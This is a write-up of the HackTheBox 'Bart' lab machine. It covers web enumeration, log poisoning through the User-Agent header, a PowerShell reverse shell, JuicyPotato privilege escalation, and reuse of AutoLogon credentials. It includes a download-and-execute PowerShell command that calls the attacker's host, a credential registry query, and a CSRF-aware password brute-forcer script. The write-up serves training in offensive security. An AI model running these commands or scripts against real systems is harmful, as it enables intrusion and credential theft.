---
title: HackTheBox - Bart Writeup w/o Metasploit
date: 2020-08-11 17:22:10
tags: [hackthebox, walkthrough, oscp-more, log poisoning, burpsuite, juicy potato, port forwarding, autologon, windows, wfuzz]
---


# HackTheBox - Bart Writeup w/o Metasploit

## Introduction

Bart is a retired Windows machine from HackTheBox. It has been rated as a medium difficulty machine, as it requires you to spend a good amount of time to enumerate but the exploiting part is not so hard.

We are presented with just one service - HTTP, consists of three different sites, we abuse a user enumeration functionality for first login, we perform some OSINT to get around the next login, and then abuse a "LFI" vulnerability to poison the logs. With log poisoning we get ourselves a low privileged shell. There are two ways to escalate our privileges, both are equally straightforward. Overall the box presents various kinds of learning opportunity, let's jump right in.

<p>
    <img src="/HackTheBox/htb-bart/0_bart.png" style="max-width: 50%;" />
    <figcaption>Box Details</figcaption>
</p>

## Reconnaissance

### General Enumeration

We will start our reconnaissance with few Nmap scans.

Performing an initial Nmap scan.

![Initial Nmap Scan](/HackTheBox/htb-bart/1_nmap1.png)

Looks like there is only one port open, port 80 - HTTP. This does not tell us much so let's perform a targeted scan on this port and then we will perform a deep port scan.

![Initial Targeted Nmap Scan](/HackTheBox/htb-bart/1_nmap2.png)

Great, we got some information to work with. Looks like this is a Windows machine and the web server that is running is IIS 10.0. Seems like upon browsing to the IP of the machine, it redirects to a *forum.bart.htb*.

We can check which Windows version is running with a quick Google search:

![IIS 10.0 Windows Version](/HackTheBox/htb-bart/1_nmap2_iis.png)

It either could be Windows 10 or Windows Server 2016.

Before going ahead with any further web enumeration, let's have an all port scan running in the background.

Command sent:
``` bash
# -T<number> : makes nmap run a lot faster but also yields a little less accurate results
nmap -Pn -n -T4 -p- -oN nmap/allports 10.10.10.81
```

*Note: Ideally I would not have opted for the "faster" command but without it Nmap decided to take a good long hour to finish the scan which was annoying.*

### Web Enumeration

Now that we have our all port scan running in the background, let's start poking at this service ourselves.

We will start by sending a `curl` request to the IP.

![Web cURL Request](/HackTheBox/htb-bart/2_http1.png)

It provides us with more or less the same output as the Nmap scan, which is good. It is always a good idea to check things manually than to entirely rely upon automated results.

Let's add the domain and sub-domain it wanted us to be redirected at to our */etc/hosts* file.

![DNS Records Added](/HackTheBox/htb-bart/2_http2.png)

The *hosts* file acts as a local DNS server with which the system can access resources within the network. Now that we have mapped the IP address to the sub-domain it wanted us to be redirected to and the domain, we should finally be able to access it.

### BurpSuite Logging

Before we start any kind of manual web enumeration where we would be interacting with the web application, it is important that you keep your BurpSuite running along and ensuring that all the requests and their respective responses are being captured.

All of the following can be done on *BurpSuite Community Edition*.

You can copy the URLs that you want to keep in scope and paste it one after another, and ensure that only those URLs are being intercepted and logged.

Or you could put a regex in the scope to ensure it captures everything from a particular domain.

![Advanced Scope Added](/HackTheBox/htb-bart/2_burp1.png)

To do the above you need to have "use advanced scope control" enabled, and then add the following regex which would fit for any sub-domain under *bart.htb*.

![Capture Relevant Requests](/HackTheBox/htb-bart/2_burp2.png)

Once the scope has been added, let's ensure we only capture the scoped requests. It's not necessary to have your "internception" enabled, we only want to log everything we do and every request sent to the server.

Use a proxy tool like FoxyProxy on FireFox to forward all the requests to the BurpSuite. Keep in mind that this is a HTTP proxy.

### Web Enumeration Contd.

Browsing to the sub-domain:

![Index Page](/HackTheBox/htb-bart/3_index.png)

Great, it is working. Let's check wappalyzer and see what it reports:

![Wappalyzer Output](/HackTheBox/htb-bart/2_http3.png)

It identified IIS 10.0 and thus inferred the OS running is Windows Server, same as we did.

It identified that the web application running is WordPress v4.8.2, and since it has found that the web application is WordPress it has thus inferred that the DB running behind is a MySQL database server and the web technology being using is PHP.

Let's browse through the index page first before we do any further enumeration.

![BART Team](/HackTheBox/htb-bart/2_http4.png)

We see that there are three team members here, with their e-mail addresses, which we will make a note of along with their names and position. E-mail addresses within a corporate are usually in the same pattern, much like what we see here.

We go down a bit and find another emplpyee.

![New Employee](/HackTheBox/htb-bart/2_http5.png)

We can guess her e-mail address, based on the pattern that we found previously.

We will always look for comments when come across a web page, go to *view source* and search for `<!--`, which is what an HTML comment starts with.

Alright, let's take a look under the hood:

![Another Employee](/HackTheBox/htb-bart/2_http6.png)

And looks like we found another employee, and he's a developer. Developer accounts are usually interesting because they would have quite some access to themselves which we could make *good* use of.

Let's look for some WordPress stuff. A WordPress website source will always be riddled with "wp-content" directories, which would tell us what plugins are being used and some other information.

![No "wp-content" Found](/HackTheBox/htb-bart/4_fake_wp1.png)

There happened to be only one entry which was also commented out. It could be a fluke, let's verify that by browsing to the admin panel - "wp-admin".

![Internal Server Error](/HackTheBox/htb-bart/4_fake_wp2.png)

The admin panel was also not accessible, if we would have ran an automated scan without checking things manually first we could have been left puzzled as to why the scan was erroring out.

### General Enumeration Contd.

Before we go any further, we must ensure that this is not entirely a rabbit hole, and to do so we will check the results of the all ports scan that we had executed earlier and see if there are any other ports that could possibly give us any more information.

![Nmap All Ports Scan](/HackTheBox/htb-bart/1_nmap3.png)

Looks like HTTP is the only service that we need to work with. If one was cautious they would run a UDP scan at this point. 

Let's move on to the web enumeration.

### Web Enumeration Contd.

Since we could not find WordPress related content on the index page, there are two possiblities:

1. WordPress content lies somewhere else, and is hidden,
2. There is no WordPress here, and hunting for one would only waste our time.

Now, since the index page does not lead us to any other page as well, let's do some directory busting.

![Gobuster Crashed](/HackTheBox/htb-bart/5_busting1.png)

It seems like there is some kind of filtering in place so that every page browsed to is considered as a valid page on server by gobuster. Let's check what this page is.

![Wildcard Page](/HackTheBox/htb-bart/5_busting2.png)

Just an image, and it sure is useless. Let's run the same command again, but do not consider "200 OK" responses from the server in the output.

*Note: If you do not know about HTTP Responses I'd highly suggest that you go through [this document](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status) by Mozilla*

![Directories Found](/HackTheBox/htb-bart/5_busting3.png)

Great we found two directories on the machines' IP - forum and monitor.

Another way that we could have done this, and a better way in my opinion, is by using `wfuzz`. Wfuzz is a fuzzing tool which could objectively be used for directory bruteforcing.
It is not necessary that all "200 OK" responses would have resulted in that same useless image, it is plausible that the tool could have encountered a valid entry too with that reponse from the server.

To achieve this, we will first run the tool without any kind of filter on it, basically to capture that useless images' information.

Command sent:
```
wfuzz -u http://10.10.10.81/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

The results would start coming in, mostly just of that useless image but now we know long that image is, 630 lines, in terms of the webpage response that we get. We will now send the same command as before but we will ask the tool to not capture any response if the response returned has 630 lines of HTML code in it.

![Directories Found](/HackTheBox/htb-bart/5_busting4.png)

And we found those directories again.

Note that I started by directory busting from the root of the web server instead of starting it from a branch - *forum.bart.htb*. Although by performing directory busting on the forum subdomain could have resulted in some results, interesting or otherwise, it is essential that you always start your content discovery from the top and then later move forward to different subdomains or directories you found. This way you would get the best, more complete, picture of the service.

ALright, let's check those directories out.

The directory */forum*, upon checking, looks like it is the same as *forum.bart.htb*. 

The directory */monitor*, presents us with a login panel:

![Login Panel](/HackTheBox/htb-bart/6_mon.png)

Looks like there was no WordPress to begin with and just because the index page had some WordPress part Wappalyzer identified as it is leveraging the web application.

Also, we found a lead, which is great. What is even better is that we have a login panel to work with and we already have some users on our hand.

It looks like the login panel is using "PHP Server Monitor v3.2.1", but when we go the website of that product we find that a version such as that does not exist:

![Version Not Found](/HackTheBox/htb-bart/6_mon2.png)

The latest version that exists is v3.2.0, and as we all know, we have not found a way to travel to the future... *yet*, so clearly application names and versions are being purposely modified to put us off the track.

Since we have a login form on our hand, let's try some default/common credentials and see if it lets us in.

![No Success](/HackTheBox/htb-bart/6_mon3.png)

I tried a few default credentials but none of them worked, and neither is the login panel giving us a way to perform user enumeration.

Let's check out the "Forgot Password?" functionality:

![User Enumeration Found](/HackTheBox/htb-bart/6_mon4.png)

Looks like through the forgot password functionality we can perform user enumeration. Let's use the list of names and email ID pattern to create a set of usernames. Some of the possibilities of the username pattern could be:

| Pattern | Example |
| -------- | -------- |
| first-name | robert |
| first-namelast-name | roberthilton |
| first-name.last-name | robert.hilton |
| first-name-initial.last-name | r.hilton |
| first-name_last-name | robert_hilton |
| first-name-initial_last-name | r_hilton |

These may not be the most exhaustive list of possiblities but are very good ones which are often seen around. We will create usernames as per the above patterns for each user we found and test each combination to ensure our test is complete and thorough.

First testing with Samantha Brown (CEO), for each test case, and we find nothing.
Next we will test for Daniel Simmons (Head of Sales), for each test case. While testing for the first test case, i.e. first-name, we found a hit for "daniel".
Since this test case brought a positive result, we will continue testing with just this test case for rest of the users. It's weird for a sales personnel to have access to a server monitor.

![Found A User](/HackTheBox/htb-bart/6_mon5.png)

And as we go on we find another user - harvey:

![Found Another User](/HackTheBox/htb-bart/6_mon6.png)

A developer having access to such a functionality seems completely normal than the previous one. Let's try logging in with Harvey. Since this is a login form and now that we have a proper username I tried performing some basic SQL injections but that did not work at all. So let's now try cracking the password.

Before we crack the password let's take a look at the request that is sent to the server.

![Login Request](/HackTheBox/htb-bart/6_mon1.png)

Since CSRF tokens are employed here, and there will be a new token per request, we will need to make a bruteforcing script of our own to get pass this login portal. We will go into creating our own script in [Beyond Root](#Brute-Forcing-Script) section. We could also do some guess work instead of making a script of our own and hope our guess is good enough, but, more often than not, they do not work.

Some guesses for the password could be "password", "password123", "pass123", "P@ssw0rd!", "developer", "developer@bart", "bartdev", "harvey", "potter", "harveypotter", "harrypotter".

Upon trying these one after another, "potter" worked! Guess work can only get you so far, there could be a very good possibility none of these would have worked, and if they had not, the python script would have been our only hope.

![Logging In](/HackTheBox/htb-bart/8_loggin_in.png)

While it is trying to login, it was trying to redirect us to "monitor.bart.htb", so let's add that to our *hosts* file.

![Hosts Updated](/HackTheBox/htb-bart/7_updatedhosts.png)

Now that we have updated the hosts, let's login again.

![Monitor Index](/HackTheBox/htb-bart/9_monitor1.png)

And we now have access to the server monitor. There are a lot of tabs here, let's browse through each.

![New Sub-domain Found](/HackTheBox/htb-bart/9_monitor2.png)

On the very next tab we find another sub-domain so let's go ahead and enter it in the hosts file as before.

![Hosts Updated](/HackTheBox/htb-bart/10_hostupdate.png)

Great, now let's continue our enumeration on the *monitor* first and then we will move on to enumerating the *internal-01* sub-domain. As a side-note, if the new sub-domain that we would have found, would have been, let's say, *internal-03*, then we should definitely add *internal-01*, *internal-02*, as well as *internal-03* and then enumerate each thoroughly.

There was no further information on the monitor sub-domain and so we will move on to the internal sub-domain. Browsing to the sub-domain:

![Dev Internal Chat](/HackTheBox/htb-bart/12_internal1.png)

And we have landed to another login portal, one that states that it is used for internal purposes by their developer. This could potentially leak some sensitive information, could be credentials to some other place which devs use, could be some vulnerable internal code they are worried about and want to fix and so are discussing for the same, all kinds of stuff. Also, it seems that this has been made custom, and custom applications are usually broken in a form or another as they have not been vetted for numerous years.

Another thing that we should remember is that we already know two people who are most likely using this - Harvey, developer, and Robert, Head of IT.

One thing that bothered me is that as soon as we browsed to the sub-domain we were redirected to this "simple chat" application. We will have gobuster running in the background, we will first ensure that it is not being hindered by some kinda wildcard stuff like before, and then poke at this application manually.

```
gobuster dir -u http://internal-01.bart.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o go_med_internal
```

## Initial Access

Now that the script is doing its' job, let's check the source of the login page:

![Internal Chat Source](/HackTheBox/htb-bart/12_internal2.png)

Let's check out the CSS file.

![Developer Name Leak](/HackTheBox/htb-bart/12_internal3.png)

Usually names of developers of firms and other such details may be found withtin the source files and so are definitely worth a look. Let's search for the same on Google:

![Result Found](/HackTheBox/htb-bart/12_internal4.png)

Looks like we already found the application being used here. Let's take a deeper look:

![Repo Contents](/HackTheBox/htb-bart/12_internal5_1.png)

Let's take a look at the contents of chat application:

![Simple Chat Contents](/HackTheBox/htb-bart/12_internal5.png)

There are two things that came to my mind:

1. This is a PHP application, it has a SQL folder, there is a possibility of an SQL injection here.
We will know that from the code.

2. There is a *register.php* file present here, and so there is a possibility that this file is present on the target too, and if the functionality is present then we could just get ourselves register and access the application.

Upon checking the code of multiple files, I ruled out the possiblity of an SQL injection here. Let's see if the *register.php* is left on the server. Let's check something more obvious, maybe a smiley from the media directory.

![Media Contents](/HackTheBox/htb-bart/12_internal6.png)

![Media Present](/HackTheBox/htb-bart/12_internal7.png)

Looks like there is a high possiblity that the unrequired files are kept on the server. Let's check the register file.

![302 Redirect](/HackTheBox/htb-bart/12_internal8_1.png)

Browsing to the */register.php*, redirects us to the */register_form.php*. Once the redirect is done, an internal serever error is thrown.

![Internal Server Error](/HackTheBox/htb-bart/12_internal8_2.png)

From the responses from these two files we can be sure that they both exist on the server and will perform their intended purpose as per the developer, which is giving us an account.

Let's take a moment and understand how the registration is working here and how can we send a request to achieve the same.

![Understanding Registration](/HackTheBox/htb-bart/12_internal8_3.png)

From the code, it looks like all we have to do is send two parameters in a POST request to the register.php file - uname (username) and passwd (password), and the password field has to be at least 8 characters long. I think we can pull that off.

![Getting Registered](/HackTheBox/htb-bart/16_abuse1.png)

We send a request that follows the code as above, and we get a 302 redirect to login.php, instead of register_form.php unlike before. Looks like a good sign

![Following Redirect](/HackTheBox/htb-bart/16_abuse2.png)

Upon following redirection it definitely looks like we have been redirected to the login page. Let's try logging in with this new credential `noobsec : nothingtoseehere`

![Logging In](/HackTheBox/htb-bart/16_abuse3.png)

And we successfully log into the Internal Chat application. It looks like our favourite developer, Harvey, has left us some gift on the server. As always, let's first check the source:

![Save Logs](/HackTheBox/htb-bart/17_log1.png)

The above code is for the "Log" button on the chat page to save all the logs, let's browse to the webpage ourselves

![Writing Logs](/HackTheBox/htb-bart/17_log2.png)

All it shows is "1", I guess it could be a binary output showing that the logs have been updated. Let's take a look at the log file.

![Log File](/HackTheBox/htb-bart/17_log3.png)

And our assumption was right, browsing to the webpage writes the logs to the text file. There are three entities per entry - date, username, user agent. We have direct access to the username so let's modify that and see what happens.

![Save Log Failure](/HackTheBox/htb-bart/17_log4.png)

Modifying the username does not help at all, it immediately responses with "0". I'm now sure this shows whether the file *log.php* was able to write to log.txt or not, and that username is not modifiable.

![Checking Log File](/HackTheBox/htb-bart/17_log5.png)

Browsing to the log file shows us that we are right about username field, let's modify the User-Agent field.

![Noobsec Browser](/HackTheBox/htb-bart/17_log6.png)

I modified the User-Agent, sent the request, and we get the response we were hoping for. Let's check the logs to ensure we were able to modify the field and get it written to the logs.

![Checking Log File](/HackTheBox/htb-bart/17_log7.png)

Looks like we are in control of the User Agent field. Although we have a good news, we also have a bad news. Bad news is that we are writing to a text file, we cannot poison a text file. Sending a malicious payload to a text file will make no difference. 

![Log.php](/HackTheBox/htb-bart/17_log8.png)

Upon browsing to the log writing PHP file, it looks like it will take any file, and any username. But as we know, it did not let us modify the username field, let's see if it is the same case with the filename parameter.

![Writing Test 1](/HackTheBox/htb-bart/17_log9.png)

Modifying the PHP file to print `phpinfo()` upon loading, and sending the request. From the response we get we can say that we succeeded in writing to *log.php* file. Let's check if that's actually the case:

![Test 1 Successful](/HackTheBox/htb-bart/17_log10.png)

Browsing to the file and ensuring we have specified the filename and username parameter without which the page won't load. We see the PHPInfo load immediately and thus can say that we were able to write to the file. We can use this knowledge to poison the file and have command execution in our hands. 

Let's try one more thing else. We know that this script is writing to the files that already existed on the server, but can we write to a non-existent file?

![Writing Test 2](/HackTheBox/htb-bart/17_log9_2.png)

To do so, I made the script write to *noobsec.php*, which we can be sure wouldn't exist on the server, and we do get the "1" response indicating that this might have worked. Let's check by browsing to */noobsec.php*.

![Created File on Server](/HackTheBox/htb-bart/17_log10_2.png)

As the page loads up just fine we can say for sure that we can even create files on this server. Only purpose this could serve is that we wouldn't have to modify already present files that could be critical to the server, and will be working with entirely different file, which even if it broke in worst possible way it would not affect the operations of the server and would be a much safer way of doing things.

*Note: The following operations are carried on the log.php file instead of this newly created file because this test idea had come while writing this write-up when everything was almost done.*

![Poisoning The Script](/HackTheBox/htb-bart/17_log11.png)

Let's leverage our knowledge of being able to modify User Agent and writing to PHP file to exploit it. Putting a PHP webshell payload in the User-Agent field, and once sent we get a response that the write operation was successful.

![Webshell Test](/HackTheBox/htb-bart/17_log12.png)

Let's test if we have remote command execution. We send the simplest command, `whoami`, and we can see that it has successfully been executed. Nice, but we can do better - getting an interactive shell, which is what we will do now.

We will make use of [Nishangs'](https://github.com/samratashok/nishang) Invoke-PowershellTcp.ps1 powershell reverse shell to get a shell on the system. Ensure you have mentioned the reverse shell command at the bottom of the file which once downloaded the target system will execute immediately.

``` bash
# Change IP and Port as required
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.16 -Port 443
```

![Hosting Shell.ps1](/HackTheBox/htb-bart/18_shell1.png)

Once the file is prepared we will host on the python web server, I use my own <a href="https://noobsec.net/linux-tips/#Python-Server" target="_blank">alias</a> to avoid typing all that.

Ensure you have your shell listener active.

![Downloading Shell.ps1](/HackTheBox/htb-bart/18_shell2.png)

Once the file is being hosted, we can send the command to get it downloaded, <a href="https://noobsec.net/privesc-windows/#File-Transfer" target="_blank">Windows file transfer commands</a>, and executed by the target system.


![Fetching The Shell](/HackTheBox/htb-bart/18_shell3.png)

Checking the listener, and sure enough, we got our low privileged shell. If you noticed, I used `rlwrap` to catch my shell here. Rlwrap provides a good amount of functionality - move cursor, maintain command history, clear terminal screen. When working with Windows shells it is hard to get a shell as functional as Linux where you can use Python to make it a fully interactive shell, unlike here.

You can learn more about rlwrap [here](https://linux.die.net/man/1/rlwrap).

## Privilege Escalation

### Local Enumeration Script

Let's transfer a local enumeration script, winPEAS, on here and run it to see if we can find anything.

![winPEAS Transferred](/HackTheBox/htb-bart/19_enum1.png)

We have successfully transferred the file, let's execute it. The script finishes and prints out all its' findings fairly quickly.

![Token Privileges](/HackTheBox/htb-bart/19_enum2.png)

It found the excessive token privileges.

![Administrator AutoLogon Credentials](/HackTheBox/htb-bart/19_enum3.png)

It also found some credentials and that too of Administrator. Let's exploit both. 

### PrivEsc 1 - Abusing Token Privileges - JuicyPotato 🥔

As soon as I get a shell the first thing that I do is check the privileges I have as the user:

![Checking Privileges](/HackTheBox/htb-bart/19_enum0.png)

We have the *SeImpersonatePrivilege* Enabled, which we could use to escalate our privileges to SYSTEM using JuicyPotato exploit. If you don't know what the exploit is, you can read a gist about it [here](https://github.com/ohpe/juicy-potato#juicy-potato-abusing-the-golden-privileges)

Let's transfer the JuicyPotato.exe binary to the target machine. The exploit can be found in [this repo](https://github.com/ohpe/juicy-potato/releases)

![JP Transferred](/HackTheBox/htb-bart/20_privesc1.png)

Once the binary is transferred, we will execute it as-is to have the usage printed out on the terminal.

![Usage Printed](/HackTheBox/htb-bart/20_privesc2.png)

Great, all we need right now is to transfer a program to the target machine for this exploit to execute. We don't really need to do this, and can have an entire powershell command directly typed out, but this could cause some issue with the way the command is interepreted. Instead, we will have the same command in a bat file and have it executed, which also looks a lot cleaner.

![Preparing Programs](/HackTheBox/htb-bart/20_privesc3.png)

We not only prepare the BAT file but also the shell that it would make the exploit download and execute. This shell is the same as the previous Nishang shell just on a different port.

Once that is done, we will have this BAT file transferred to the target machine and execute the exploit.

![Exploit Executed](/HackTheBox/htb-bart/20_privesc4.png)

Looks like the exploit has crashed. It did not work with the default CLSID, so we will look for one that will. To do so, we need to first know which version of Windows the target is.

![Systeminfo](/HackTheBox/htb-bart/20_privesc5.png)

We have a Windows 10 Pro on our hands, so we will look for CLSIDs in the same repo as earlier for this OS:

![Win10 CLSID](/HackTheBox/htb-bart/20_privesc6.png)

I decided to test with the *wuauserv*, which is Windows Update Service. Not all services are necessary to be present in each OS, but some are crucial and would have a higher probability of existence in the system.

We will now run the command with this new CLSID that we have selected as below:

![Exploit Executed](/HackTheBox/htb-bart/20_privesc7.png)

And we have successfully executed the exploit. Let's go take a look at our listener and see whether we fetched a SYSTEM shell or not:

![SYSTEM Shell Fetched](/HackTheBox/htb-bart/20_privesc8.png)

And we are SYSTEM! Amazing. We could now go fetch our flags but before that let's take a look at our AutoLogon credentials and see what we can do with that.

### PrivEsc 2 - Abusing AutoLogon Credentials

We have Administrators' credentials in the AutoLogon registry. It is important to note that although this password looks like a hash, it is not. AutoLogon credentials are never hashed, they're in plaintext.
 
We could have found these credentials manually by executing the following command:

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | findstr "DefaultUserName DefaultDomainName DefaultPassword"
```

The above command will only successfully work on a 64-bit shell.

The shell we got from the log poisoned RCE is a 32-bit process. We could check the same by doing the following:

![32-Bit Process](/HackTheBox/htb-bart/process_bad.png)

To get a 64-bit shell, we transfer 64-bit netcat on to the target system and have it send us a fresh new shell.

![nc64 Transferred](/HackTheBox/htb-bart/process_bad1.png)

We got a new shell and now let's see if this one is a 64-bit process or not:

![Got 64-Bit Shell](/HackTheBox/htb-bart/process_bad2.png)

Looks like it is. If you wanted to see the difference in output of just a single registry query could make between 32-bit process and 64-bit process, see the following screenshots:

![32-Bit Registry Query](/HackTheBox/htb-bart/process_bad3.png)

![64-Bit Registry Query](/HackTheBox/htb-bart/process_bad4.png)

A lot of data is missed in the 32-bit one, including the one we care about the most - password. Since we can now fetch the password, let's only print out what is necessary:

![64-Bit Registry Filtered Query](/HackTheBox/htb-bart/process_bad5.png)

Nice, we now know how to get this value manually, so let's exploit it.

#### Method 1 - SMBExec.py

Since we know the administrators' password, we can log in as administrator using `smbexec.py`. Smbexec.py, winexe, PSExec, they all use port 445 to operate on. We will run the following command:

```
smbexec.py BART/Administrator:3130438f31186fbaf962f407711faddb@10.10.10.81
```

![Connection Failed](/HackTheBox/htb-bart/22_pe3.png)

But once executed, the command will get stuck and fail. There is a possibility that the firewall must be stopping us from connecting to the SMB service. Since we already have a low privileged shell on the system, let's forward the SMB port, 445, in order to be able to work with it. 

I'll use chisel, a HTTP tunneling tool for port forward, download appropriate binaries from its' [Git repo releases](https://github.com/jpillora/chisel/releases/tag/v1.6.0). We will first transfer the windows executable to the target system, and then have our chisel server listening for reverse connections:

These are the <a href="https://noobsec.net/privesc-windows/#Port-Forwarding" target="_blank">commands sent</a>

![Port Forwarded](/HackTheBox/htb-bart/22_pe1.png)

![Connection Established](/HackTheBox/htb-bart/22_pe2.png)

#### Method 2 - Run-as

We could also leverage the password in making a credentialed process. The usual runas command did not work for some odd reason but the one by [0xdf](https://0xdf.gitlab.io/2018/07/15/htb-bart.html#use-the-source--logging-in) worked like a charm.

Ensure you have your shell script hosted and listener running in the back.

The commands have also been added to the Windows privesc cheatsheet. The commands sent are:

``` powershell
$username = "BART\Administrator"
$password = "3130438f31186fbaf962f407711faddb"
$secstr = New-Object -TypeName System.Security.SecureString
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16/shell.ps1') } -Credential $cred -Computer localhost
```

![PowerShell Runas](/HackTheBox/htb-bart/23_runas1.png)

The commands have been executed, and the process has stuck which is a good sign. We move to our listener tab and check:

![Got Admin Shell](/HackTheBox/htb-bart/23_runas2.png)

And we have got an adminitrator shell. Great.

#### Method 3 - Net use

While checking 0xdfs' write-up for the runas command turns out there was another way of getting access to the administrator owned files using `net use`. Although our objective here is to get admin or SYSTEM shell, we cannot ignore how crucial it could be in an engagement to be able to get hold of admin owned files.

Command sent:
``` cmd
net use x: \\localhost\c$ /user:Administrator 3130438f31186fbaf962f407711faddb
```

The command tells the machine that create a new drive "x" which would be a copy of `\\localhost\c$` "share", which is the C drive, as the user administrator and here is admins' password. The machine checks the validity of the credential we passed and since it is correct it creates a copy of the C drive in the X drive.

![Created C:\ Copy](/HackTheBox/htb-bart/24_netuse1.png)

The copy has been created successfully, let's see if we can access it.

![Accessing Admin Files](/HackTheBox/htb-bart/24_netuse2.png)

And sure enough, we were able to access admins' files while having a service account.

## Flags

Now that we have rooted it in different ways, it is time we go get our loot:

![Root.txt](/HackTheBox/htb-bart/21_root.png)

![Finding User.txt](/HackTheBox/htb-bart/21_user1.png)

There are a lot of directories here but we can make use of PowerShell to look for the file we want since we know the name of the file. The following command will recursively search for all the files in the `C:\Users\` directory for any file that contains the string *user.txt* in it, if there are any errors then it will ignore it and keep going.

Command sent:
```
Get-ChildItem -Path C:\Users\ -Include *user.txt* -Recurse -ErrorAction SilentlyContinue
```

![Recursive Search](/HackTheBox/htb-bart/21_user2.png)

![User.txt](/HackTheBox/htb-bart/21_user3.png)

## Post Exploitation
We could stop after getting the flags but where's the fun in that. We know there were two login panels so there must be at least two tables from which we could extract credentials from.

Since we started our shell from simple chat application, let's take a look at the database credentials:

![Simple Chat DB Creds](/HackTheBox/htb-bart/postexp1.png)

Now let's take a look at the database credentials of the monitor application:

![Monitor DB Creds](/HackTheBox/htb-bart/postexp2.png)

Great we got database credentials of both the applications, now all we have to do is extract the users' hashes.

To do so, we will first have to forward the MySQL port to us to be able to connect to it:

![MySQL Port Forwarding](/HackTheBox/htb-bart/postexp3.png)

Now that the port is forwarded we can freely connect to it using our Kali machine:

![Accessing Chat DB](/HackTheBox/htb-bart/postexp4.png)

The information_schema table is an internal database for MySQL, we won't bother looking into it since we already have access to the database. The *internal_chat* database consists of two tables, let's get all the contents from both of them:

![Dumping Creds](/HackTheBox/htb-bart/postexp5.png)

Nice, we even see the "noobsec" user I'd created earlier. We could crack these hashes for later use.
Now that we have gotten all the data from this database, let's take a look at the monitor database:

![Monitor DB](/HackTheBox/htb-bart/postexp6.png)

Since we know that the monitor application was using the *sysmon*  database, we will first look into it. Let's dump the contents of the *_users* table:

![Dumping Creds](/HackTheBox/htb-bart/postexp7.png)

Looks like we selected the right table to dump creds from, we could add these hashes to our cracking list as well. Since there was a forum database too, although there was no place in that sub-domain to login, let's take a look at it:

![Forum DB](/HackTheBox/htb-bart/postexp8.png)

There happens to be a sole user in this table - bobby. We could add this one to our cracking list as well.

## Beyond Root

### Log Poisoning Analysis

FOllowing are the contents of the *log.php* file:

``` php
<?php                                                                                                                                                                                                                                      
ini_set("display_errors", 1);
error_reporting(E_ALL;

// List of users (Can't be arsed of getting them from the DB!)                                                     
$users = array(
    "daniel",
    "harvey",
    "bobby"                                                                                                       
);

// Extensions not allowed
$disallowedExtensions = array(
    "jsp",
    "exe"
);

$userAgent = $_SERVER['HTTP_USER_AGENT'];
$filename = $_GET['filename'];
$username = $_GET['username'];
$_SESSION['user_agent'] = $userAgent;

// Check extension (Temporarly disabled)
/*$explodedFilename = !is_null($filename) ? explode(".", $filename) : array();
if(!empty($explodedFilename) && in_array($explodedFilename [1], $disallowedExtensions))
{
    echo 0;
    die();
}*/

// Check if user is valid
if(!in_array($username, $users))
{
    echo 0;die();
}

// Check if file exists
//if(!file_exists($filename))
//{
    $string = "[" . date("Y-m-d H:i:s", time()) . "] - " . $username . " - " . $userAgent;
    file_put_contents($filename, $string, FILE_APPEND);
    echo 1;
//}
//else
//{
//    echo 0;
//}
?>
```

By reading the code do we not only understand what makes the code vulnerable but also what could be done to make it secure.

Let's first understand the code:

 - The code starts off by making an array of usernames, hardcoding them, with which the logs will be saved.
 - Next it defines a set of extensions that must be disallowed.
 - It takes User-Agent, filename, username directly from the user input and passes it on to the PHP variables without any sanitization.
 - The file extension check has been commented out, and so there will be no check against any unwanted file extensions that a malicious user could send in
 - Next a username check is performed, and only those are accepted which are in the array defined above.
 - A check against file exists or not is commented out. The check done looks like it would have done exactly the opposite than what was intended, i.e. appending to the file only if it does not exist, and if it does, print "0"

Now let's talk about where it went wrong:

 - Instead of having a disallowed extensions array, an allow extension array should have been kept.
 - Trusting user input and passing it directly to the PHP variables to user. This allowed us to pass whatever we wanted in the User-Agent header.
 - Removing file exist check also allowed to create files on the server.

### Brute Forcing Script

My script was shabby and not so aesthetically pleasing, so I took some parts of mine (CSRF token regex, setting cookies, session generation, not expanding wordlist) and stuck it in 0xdfs' script. You can check out his script [here](https://0xdf.gitlab.io/2018/07/15/htb-bart.html#brute-forcer-source)

You can download my script from my [scripts repo](https://github.com/krnb/scripts/tree/master/HTB/bart)

``` python
#!/usr/bin/env python3

import re
import requests
import sys
from multiprocessing import Pool


# Definitions / constants
MAX_PROC = 50
url = "http://monitor.bart.htb/"
csrf_re = 'name="csrf" value="(.*)"'
username = "harvey"

# Start a session, it automatically takes the cookies from response and uses it for requests
s = requests.Session()

def usage():
    print("{} <wordlist>".format(sys.argv[0]))
    print("wordlist should be one word per line")
    sys.exit(1)


# Gets CSRF token, uses that to send a login request, returns if it worked or not
def brute(password):
    r = s.get(url)
    csrf = re.findall(csrf_re, r.text)[0]
    
    data = {"csrf": csrf,
        "user_name": username,
        "user_password": password,
        "action":"login"}
    r = s.post(url, data=data)

    if "The information is incorrect" in r.text:
        return password, False
    else:
        return password, True


# Taking the words, sending it to brute function using multiprocessing
def main(wordlist, nprocs=MAX_PROC):
    with open(wordlist, 'r', encoding='latin-1') as f:
        words = f.read().rstrip().replace('\r','').split('\n')

    pool = Pool(processes=nprocs)

    i=0
    print_status(0,len(words))
    for password, status in pool.imap_unordered(brute, [passwd for passwd in words]):
        if status:
            sys.stdout.write("\n[+] Found password: {} \n".format(password))
            pool.terminate()
            sys.exit(0)
        else:
            i += 1
            print_status(i, len(words))

    print("\n\n[-] Password not found\n")


# ~a e s t h e t i c s~
def print_status(i, l, max=30):
    sys.stdout.write("\r|{}>{}|  {:>15}/{}".format( "=" * ((i * max)//l), " " * (max - ((i * max)//l)), i, l))


if __name__ == '__main__':
    if len(sys.argv) != 2:
        usage()
    main(sys.argv[1])

```

The script requires you to make it executable. Once the script is run as-is, it will throw the usage out:

![Bruteforcer Usage](/HackTheBox/htb-bart/brute0.png)

For the demo I have used a super small wordlist, the script will show the number of request to be made, the arrow goes further towards the completion per request, and once found it will break out and print out the password on the terminal, like below:

![Password Found](/HackTheBox/htb-bart/brute.png)

